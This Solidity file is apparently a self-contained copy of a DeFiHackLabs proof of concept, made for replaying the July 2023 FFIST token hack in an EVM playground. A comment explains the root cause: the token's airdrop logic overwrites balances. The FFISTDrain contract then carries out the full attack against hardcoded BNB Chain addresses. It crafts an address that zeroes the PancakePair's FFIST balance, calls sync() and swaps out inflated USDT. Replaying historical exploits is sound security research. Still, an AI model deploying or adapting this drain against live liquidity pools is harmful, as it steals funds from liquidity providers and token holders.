// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-07-FFIST).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (attacker == address(this); there is no standalone exploit contract). This
// contract is a faithful, self-contained copy of that inline attack so the
// playground can deploy it and record run(). Logic and constants are copied
// verbatim from test/FFIST_exp.sol::testExploit()/pairReserveManipulation()/
// WBNBToFFIST()/FFISTToWBNB().
//
// Root cause: FFIST (GoldCoin)'s _airdrop() runs on every non-whitelisted
// transfer and unconditionally OVERWRITES `_balances[airdropAddress] = 1` for
// 4 pseudo-random addresses derived from `(lastAirdropAddress | block.number)
// ^ (from ^ to)`. The attacker pre-computes a `to` such that transfer(to, 0)
// forces one of those 4 derived addresses to collide with the FFIST/USDT
// PancakePair itself, crushing the pair's REAL FFIST balance down to 1 wei
// (the airdrop assigns, not adds). The attacker then calls pair.sync(),
// which reads the now-crushed real balance and snaps the pair's CACHED
// reserve1 down to 1 to match — repricing the AMM as if it holds only 1 wei
// of FFIST against ~55,423 USDT. Selling FFIST into that pool now returns a
// grossly disproportionate amount of USDT.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IAirdropToken is IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function lastAirdropAddress() external view returns (address);
}

interface IPancakePair {
    function sync() external;
}

interface IPancakeRouterV2 {
    // Real signature returns nothing (void) — matches the deployed
    // PancakeRouter interface exactly (IPancakeRouter02), unlike the plain
    // Uniswap V2 router's swapExactTokensForTokens, which returns amounts[].
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract FFISTDrain {
    IERC20 private constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IAirdropToken private constant FFIST = IAirdropToken(0x80121DA952A74c06adc1d7f85A237089b57AF347);
    IERC20 private constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    address private constant PAIR = 0x7a3Adf2F6B239E64dAB1738c695Cf48155b6e152;
    IPancakeRouterV2 private constant ROUTER = IPancakeRouterV2(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    function run() external {
        WBNB.approve(address(ROUTER), type(uint256).max);
        FFIST.approve(address(ROUTER), type(uint256).max);
        wbnbToFfist();
        pairReserveManipulation();
        ffistToWbnb();
    }

    function pairReserveManipulation() internal {
        // Deliberately craft `to` so that _airdrop()'s derived airdropAddress
        // collides with the Pair's own address — see GoldCoin.sol:_airdrop().
        address to = address(
            uint160(address(this)) ^ (uint160(FFIST.lastAirdropAddress()) | uint160(block.number)) ^ uint160(PAIR)
        );
        FFIST.transfer(to, 0);
        IPancakePair(PAIR).sync();
    }

    function wbnbToFfist() internal {
        address[] memory path = new address[](3);
        path[0] = address(WBNB);
        path[1] = address(USDT);
        path[2] = address(FFIST);
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    function ffistToWbnb() internal {
        address[] memory path = new address[](3);
        path[0] = address(FFIST);
        path[1] = address(USDT);
        path[2] = address(WBNB);
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            FFIST.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
